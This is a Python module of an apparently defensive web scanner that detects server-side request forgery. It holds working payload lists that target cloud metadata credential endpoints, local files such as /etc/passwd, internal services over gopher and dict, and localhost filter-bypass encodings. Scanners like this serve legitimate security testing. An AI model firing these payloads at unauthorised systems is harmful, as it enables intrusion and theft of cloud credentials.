"""Server-Side Request Forgery (SSRF) Scanner - OWASP A10:2021."""
import re
import time
from urllib.parse import urlparse
from core.base_scanner import BaseScanner
from core.logger import vuln, debug, info

# Internal/metadata targets commonly used in SSRF testing
SSRF_TARGETS = [
    # Cloud metadata
    ("http://169.254.169.254/latest/meta-data/",          r"ami-id|instance-id|local-ipv4|security-credentials"),
    ("http://169.254.169.254/latest/meta-data/hostname",   r"\.internal|\.compute\.amazonaws|\.ec2\.internal"),
    ("http://metadata.google.internal/computeMetadata/",   r"computeMetadata|project-id|instance"),
    ("http://169.254.169.254/metadata/v1/",                r"droplet_id|hostname|region"),  # DigitalOcean
    ("http://100.100.100.200/latest/meta-data/",           r"instance-id|hostname"),         # Alibaba
    # Localhost / internal
    ("http://localhost/",                                   r"html|body|server|apache|nginx|welcome"),
    ("http://127.0.0.1/",                                  r"html|body|server|apache|nginx|welcome"),
    ("http://[::1]/",                                      r"html|body|server|apache|nginx"),
    ("http://0.0.0.0/",                                    r"html|body|server"),
    ("http://localhost:22/",                               r"SSH-2\.0|OpenSSH"),
    ("http://localhost:25/",                               r"220.*SMTP|ESMTP"),
    ("http://localhost:3306/",                             r"mysql|mariadb|\x00"),
    ("http://localhost:5432/",                             r"PostgreSQL"),
    ("http://localhost:6379/",                             r"PONG|\+PONG|-ERR"),
    ("http://localhost:27017/",                            r"mongodb|It looks like you are trying"),
    ("http://localhost:8080/",                             r"html|body|Tomcat|Jenkins|Jira"),
    ("http://localhost:8500/",                             r"Consul"),
    ("http://localhost:4444/",                             r"Metasploit"),
    # Internal RFC1918 probes (sampled)
    ("http://192.168.1.1/",                                r"html|router|gateway|admin"),
    ("http://10.0.0.1/",                                   r"html|router|gateway|admin"),
    # File read via SSRF
    ("file:///etc/passwd",                                 r"root:.*:0:0:"),
    ("file:///C:/windows/win.ini",                         r"\[fonts\]"),
    # Dict protocol
    ("dict://localhost:11211/stat",                        r"STAT|VERSION"),
    # Gopher (advanced SSRF)
    ("gopher://localhost:6379/_*1%0d%0a$4%0d%0aPING%0d%0a", r"PONG|\+PONG"),
]

# URL parameters commonly vulnerable to SSRF
SSRF_PARAM_NAMES = re.compile(
    r"url|uri|path|src|source|href|link|redirect|callback|"
    r"endpoint|host|server|fetch|load|file|resource|target|"
    r"next|return|to|goto|img|image|proxy|forward",
    re.IGNORECASE
)

SSRF_SUCCESS = re.compile(
    r"ami-id|instance-id|local-ipv4|security-credentials|"
    r"computeMetadata|project-id|"
    r"root:.*:0:0:|daemon:|nobody:|127\.0\.0\.1|"
    r"SSH-2\.0|OpenSSH|ESMTP|mysql|PostgreSQL|PONG|"
    r"\[fonts\]|for 16-bit",
    re.IGNORECASE
)

# Bypass encodings for 127.0.0.1
BYPASS_VARIANTS = [
    "http://127.0.0.1/",
    "http://127.1/",
    "http://0x7f000001/",
    "http://2130706433/",      # decimal
    "http://0177.0.0.1/",      # octal
    "http://127.000.000.001/",
    "http://①②⑦.⓪.⓪.①/",
    "http://127.0.0.1.nip.io/",
    "http://localtest.me/",
    "http://spoofed.burpcollaborator.net/",
]


class SSRFScanner(BaseScanner):
    MODULE_NAME = "ssrf"
    OWASP_CATEGORY = "A10:2021 - Server-Side Request Forgery"

    def scan(self, urls: list) -> list:
        findings = []
        tested = set()

        for url in urls:
            params = self.get_url_params(url)
            for param, values in params.items():
                # Prioritize URL-like or SSRF-named params
                val = values[0] if values else ""
                is_ssrf_param = SSRF_PARAM_NAMES.search(param)
                is_url_value = val.startswith("http") or val.startswith("/")

                if not (is_ssrf_param or is_url_value):
                    continue

                key = f"{url}:{param}"
                if key in tested:
                    continue
                tested.add(key)

                info(f"  [~] Testing SSRF: {url} | param={param}")
                findings.extend(self._test_param(url, param))

            # Also test all params if no obvious SSRF params found
            if not findings:
                for param in params:
                    key = f"all:{url}:{param}"
                    if key in tested:
                        continue
                    tested.add(key)
                    findings.extend(self._test_param(url, param))

            # Test forms
            forms = self.get_forms(url)
            for form in forms:
                for field in form["inputs"]:
                    if not SSRF_PARAM_NAMES.search(field):
                        continue
                    key = f"form:{form['url']}:{field}"
                    if key in tested:
                        continue
                    tested.add(key)
                    findings.extend(self._test_form_field(form, field))

        return findings

    def _test_param(self, url: str, param: str) -> list:
        findings = []

        # Test SSRF targets
        for target, sig in SSRF_TARGETS:
            injected = self.inject_param(url, param, target)
            resp = self.session.get(injected)
            if not resp:
                continue

            matched = None
            if sig and re.search(sig, resp.text, re.IGNORECASE | re.DOTALL):
                matched = re.search(sig, resp.text, re.IGNORECASE | re.DOTALL)
            elif SSRF_SUCCESS.search(resp.text):
                matched = SSRF_SUCCESS.search(resp.text)

            if matched:
                start = max(0, matched.start() - 40)
                evidence = resp.text[start:start + 300].strip()
                f = self.make_finding(
                    url=url, param=param, payload=target,
                    evidence=evidence[:300],
                    severity="CRITICAL",
                    description=(
                        f"SSRF: Parameter '{param}' causes the server to make requests to internal "
                        f"resources. Target '{target}' returned sensitive data."
                    ),
                    remediation=(
                        "Validate and sanitize all URL inputs. Implement an allowlist of permitted URLs. "
                        "Block requests to internal IP ranges (RFC1918). "
                        "Use a URL parser to detect and reject localhost/internal targets. "
                        "Disable unused URL schemes (file://, dict://, gopher://)."
                    ),
                )
                vuln(f"  [VULN] SSRF @ {url} | param={param} | target={target}")
                findings.append(f)
                return findings  # One confirmed finding per param is enough

        # Test bypass variants against localhost
        for target in BYPASS_VARIANTS[:6]:
            injected = self.inject_param(url, param, target)
            resp = self.session.get(injected)
            if resp and resp.status_code == 200 and len(resp.text) > 50:
                if SSRF_SUCCESS.search(resp.text):
                    f = self.make_finding(
                        url=url, param=param, payload=target,
                        evidence=f"HTTP 200 from bypass variant {target} (len={len(resp.text)})",
                        severity="CRITICAL",
                        description=f"SSRF via IP bypass encoding: '{target}' reached internal host.",
                        remediation="Parse and normalize URLs before validation. Block all localhost representations.",
                    )
                    vuln(f"  [VULN] SSRF (bypass) @ {url} | param={param}")
                    findings.append(f)
                    return findings

        # Time-based blind SSRF detection (slow internal host)
        # We compare response times for a routable vs unroutable address
        try:
            t0 = time.time()
            self.session.get(self.inject_param(url, param, "http://10.255.255.1/"))
            slow = time.time() - t0

            t0 = time.time()
            self.session.get(self.inject_param(url, param, "http://93.184.216.34/"))
            fast = time.time() - t0

            if slow > fast + 3.0 and slow > 4.0:
                f = self.make_finding(
                    url=url, param=param,
                    payload="http://10.255.255.1/ (internal timeout probe)",
                    evidence=f"Internal address timed out in {slow:.1f}s vs external {fast:.1f}s",
                    severity="HIGH",
                    description="Blind SSRF detected via timing: server appears to be making network requests to the provided URL.",
                    remediation="Implement URL allowlist. Block RFC1918 addresses. Use SSRF-safe HTTP client.",
                )
                vuln(f"  [VULN] Blind SSRF (timing) @ {url} | param={param}")
                findings.append(f)
        except Exception as e:
            debug(f"SSRF timing test error: {e}")

        return findings

    def _test_form_field(self, form: dict, field: str) -> list:
        findings = []
        for target, sig in SSRF_TARGETS[:8]:
            results = self.test_form(form, target, field_override=field)
            for fname, resp in results:
                if not resp:
                    continue
                matched = None
                if sig and re.search(sig, resp.text, re.IGNORECASE | re.DOTALL):
                    matched = re.search(sig, resp.text, re.IGNORECASE | re.DOTALL)
                if matched:
                    start = max(0, matched.start() - 40)
                    f = self.make_finding(
                        url=form["url"], param=field, payload=target,
                        evidence=resp.text[start:start + 300].strip()[:300],
                        severity="CRITICAL",
                        description=f"SSRF via form field '{field}'.",
                        remediation="Validate all URL inputs. Block internal IP ranges.",
                    )
                    vuln(f"  [VULN] SSRF (form) @ {form['url']} | field={field}")
                    findings.append(f)
                    return findings
        return findings
